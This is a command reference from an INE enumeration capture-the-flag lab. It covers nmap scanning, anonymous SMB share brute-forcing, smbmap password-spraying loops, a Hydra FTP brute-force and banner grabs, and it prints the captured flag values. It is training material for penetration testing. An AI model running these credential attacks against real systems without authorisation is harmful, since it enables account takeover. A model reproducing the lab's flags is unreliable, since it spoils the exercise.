# Command Reference — Assessment Methodologies: Enumeration CTF 1

A concise technical reference of all verified commands executed during the **INE Assessment Methodologies: Enumeration CTF 1** laboratory engagement.

---

## 1. Network & Port Scanning

### Comprehensive Nmap TCP Scan
```bash
nmap -sV -sC -p- -Pn target.ine.local
```
- `-sV`: Probes open ports to determine service and version details.
- `-sC`: Executes default safe Nmap Scripting Engine (NSE) scripts.
- `-p-`: Scans all 65,535 TCP ports to discover non-standard services.
- `-Pn`: Treats the host as online, skipping ICMP host discovery.
- `target.ine.local`: Hostname of the target system (resolved to `192.27.166.3` / `192.211.73.3`).
- **Findings**: Open ports discovered: 22/tcp (OpenSSH 8.2p1), 139/tcp (Samba 4.6.2), 445/tcp (Samba 4.6.2), 5554/tcp (vsftpd 2.0.8 or later).

### Rapid Port Verification Scan
```bash
nmap -p- -T4 -v target.ine.local
```
- `-p-`: Scans all 65,535 TCP ports.
- `-T4`: Sets aggressive timing template for faster execution.
- `-v`: Increases output verbosity during scan progress.
- **Findings**: Quickly confirmed open ports 22, 139, 445, and 5554.

---

## 2. Wordlist Verification & SMB Share Enumeration

### Wordlist Directory Inspection
```bash
ls -lh /root/Desktop/wordlists
```
- Lists wordlists provided in the lab environment:
  - `shares.txt` (563 bytes) — Potential SMB share names.
  - `unix_passwords.txt` (7.7 KB) — Common Unix passwords dictionary.

### Anonymous SMB Share Brute-Forcing Loop
```bash
for share in $(cat /root/Desktop/wordlists/shares.txt); do
smbclient -N //target.ine.local/$share -c 'ls' 2>/dev/null && echo "BULDUM: $share"
done
```
- Loops through each candidate share name in `shares.txt`.
- `-N`: Connects using a null session (no password prompt / anonymous).
- `-c 'ls'`: Executes the directory listing command upon connection.
- `2>/dev/null`: Silences standard error output for failed connections (`NT_STATUS_BAD_NETWORK_NAME`).
- `&& echo "BULDUM: $share"`: Prints notification when an accessible share is identified.
- **Findings**: Identified accessible share `pubfiles` containing `flag1.txt`.

### Anonymous Share Interaction via smbclient
```bash
smbclient //target.ine.local/pubfiles -N
```
- Opens an interactive SMB session to the `pubfiles` share without credentials.
- `ls`: Lists files in the share (`flag1.txt`, 40 bytes).
- `get flag1.txt`: Downloads `flag1.txt` to the local directory.

### Reading Flag 1
```bash
cat flag1.txt
```
- Discloses: `FLAG1{79554810d40d4852b8d6698288a1e20c}`.

---

## 3. SMB User Enumeration & Password Spraying

### Comprehensive Samba Enumeration with enum4linux
```bash
enum4linux -a target.ine.local
```
- `-a`: Executes all simple enumeration routines (user enumeration, share enumeration, password policy, RID cycling).
- **Findings**: Identified local user accounts: `josh`, `bob`, `nancy`, `alice`.

### SMB Password Spraying Loop using smbmap
```bash
for u in $(cat users.txt); do
for p in $(cat unix_passwords.txt); do
smbmap -H target.ine.local -u $u -p $p -q | grep -E "READ|WRITE" && echo "succes! user: $u password: $p"
done
done
```
- Iterates over enumerated usernames (`users.txt`) and passwords (`unix_passwords.txt`).
- `smbmap`: Tests SMB authentication and permissions across available shares.
  - `-H target.ine.local`: Target host.
  - `-u $u`: Candidate username.
  - `-p $p`: Candidate password.
  - `-q`: Quiet mode (suppresses banners).
- `grep -E "READ|WRITE"`: Filters output to detect shares granting access permissions.
- **Findings**: Successfully identified valid credentials for user `josh` (`josh:[REDACTED]`).

### Accessing Private Share via smbclient
```bash
smbclient //target.ine.local/josh -U josh
```
- Connects to the private user share `josh` using authenticated credentials.
- `ls`: Discovers `flag2.txt` (119 bytes).
- `get flag2.txt`: Downloads `flag2.txt`.

### Reading Flag 2
```bash
cat flag2.txt
```
- Discloses: `FLAG2{c2d8468af56244cfa869851174cf27de}`.

---

## 4. Custom Port FTP Enumeration & Hydra Brute-Forcing

### Banner Grabbing via Netcat on Port 5554
```bash
nc -vn 192.211.73.3 5554
```
- Connects directly to the non-standard service port 5554.
- `-v`: Verbose output.
- `-n`: Numeric IP (skips DNS resolution).
- **Findings**: Exposes the vsFTPd service banner leaking targeted usernames:
  `220 Welcome to blah FTP service. Reminder to users, specifically ashley, alice and amanda to change their weak passwords immediately!!!`

### Creating Targeted User List
```bash
echo -e "ashley\nalice\namanda" > users2.txt
```
- Generates `users2.txt` containing the three user accounts highlighted in the FTP banner.

### Password Brute-Forcing with Hydra
```bash
hydra -L users2.txt -P /root/Desktop/wordlists/unix_passwords.txt ftp://192.211.73.3:5554
```
- `-L users2.txt`: Specifies the custom username list.
- `-P /root/Desktop/wordlists/unix_passwords.txt`: Specifies the password wordlist.
- `ftp://192.211.73.3:5554`: Targets the FTP service running on custom port 5554.
- **Findings**: Successfully cracked credentials for `alice` (`alice:[REDACTED]`).

### Authenticated FTP Session & Flag 3 Extraction
```bash
ftp 192.211.73.3 5554
```
- Authenticates to the FTP service as user `alice` using the cracked password.
- `ls`: Identifies `flag3.txt` (40 bytes).
- `get flag3.txt`: Downloads the file to the local directory.

### Reading Flag 3
```bash
cat flag3.txt
```
- Displays `flag3.txt` contents (partially visible — full value not verified due to vertical clipping at the bottom of the terminal window in screenshot 12).

---

## 5. SSH Pre-Login Banner Enumeration

### Connecting to SSH to Trigger Pre-Authentication Banner
```bash
ssh target.ine.local
```
- Initiates an SSH connection to port 22.
- Accepts the host ED25519 key fingerprint.
- **Findings**: The server displays its pre-authentication legal warning banner (`issue.net` / MOTD), disclosing `FLAG4{1ba9d242fa514e4cb4858bfc5f1fd969}` directly above the password prompt.

